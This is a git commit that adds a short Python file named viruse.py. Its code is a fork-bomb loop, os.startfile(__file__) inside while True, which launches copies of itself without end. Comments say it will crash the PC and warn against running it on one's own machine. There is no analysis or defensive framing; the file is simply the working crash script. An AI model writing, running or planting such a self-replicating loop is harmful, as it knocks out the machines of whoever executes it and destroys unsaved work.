6c16b35f5119a4d330fa8cfe89a337e735837849
FZ <85672261+fzmirsalim@users.noreply.github.com>
2021-07-07 21:09:21 +0430

    from FZ

---
+++ viruse.py
@@ -0,0 +1,12 @@
+#this script will run itself infinitely many times and pc will crash
+###Don't try it on your own pc
+
+
+
+import os
+while True:
+    os.startfile(__file__)
+
+#FZ.mirsalim
+#aparat.com/Gomnam_hh
+    
